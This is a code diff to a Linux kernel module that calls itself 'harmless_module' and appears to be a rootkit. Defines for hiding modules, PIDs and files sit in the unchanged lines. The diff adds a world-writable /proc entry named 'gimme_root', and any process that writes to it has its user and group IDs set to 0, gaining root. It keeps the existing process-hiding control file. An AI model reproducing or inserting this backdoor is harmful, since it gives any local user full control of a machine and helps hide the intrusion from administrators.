@@ -12,7 +12,10 @@
 #define HIDE_MODULE_FILE "hide_module"
 #define HIDE_PID_FILE "hide_pid"
 #define HIDE_FILE_FILE "hide_file"
+#define GIVE_ROOT_FILE "gimme_root"
+
 #define MODULE_NAME "harmless_module"
+
 
 #define CR0_PAGE_WP 0x10000
 #define INTERNAL_BUFFER_LEN 1024
@@ -116,6 +119,7 @@ static int process_hider(struct file* fp, void* d, filldir_t filldir){
 }
 
 
+/*
 static int control_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
 	
 		
@@ -127,6 +131,7 @@ static int control_write(struct file* file, const char __user * buf, unsigned lo
 	printk(KERN_INFO"random write strncmp");
 	return count;
 }
+*/
 
 static int pid_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
 
@@ -172,6 +177,18 @@ static int pid_hide_read(char *buffer, char **buffer_location, off_t off, int co
 }
 
 
+static int give_root_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+	struct cred* creds  = prepare_creds();
+	creds->uid = 0;
+	creds->gid =0 ;
+	creds->euid = 0; 
+	creds->egid = 0 ; 
+	creds->fsuid = 0 ;
+	creds->fsgid = 0 ;
+	commit_creds(creds);
+
+	return count;
+}
 
 static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode, struct proc_dir_entry* parent
 		,int (*write_proc)(struct file*, const char __user *buf , unsigned long count, void *data)
@@ -187,8 +204,13 @@ static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode
 		return NULL;	
 	}
 
-	tmp -> write_proc = write_proc;
-	tmp -> read_proc = read_proc;	
+	if(write_proc!=NULL){
+		tmp -> write_proc = write_proc;
+	}
+
+	if(read_proc!=NULL){
+		tmp -> read_proc = read_proc;	
+	}
 
 	return tmp;
 
@@ -196,15 +218,14 @@ static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode
 
 static int control_init(void){
 
-	static struct proc_dir_entry *tmp;
 
-	//control dir setup
 	proc_control = proc_mkdir(CONTROL_DIR, NULL); 
 
 	if( proc_control == NULL ){
 		return 0;	
 	}
-	tmp = create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_read);
+	create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_read);
+	create_procfs_entry(GIVE_ROOT_FILE, 0666,proc_control,give_root_write,NULL);
 
 	return 1; 
 }
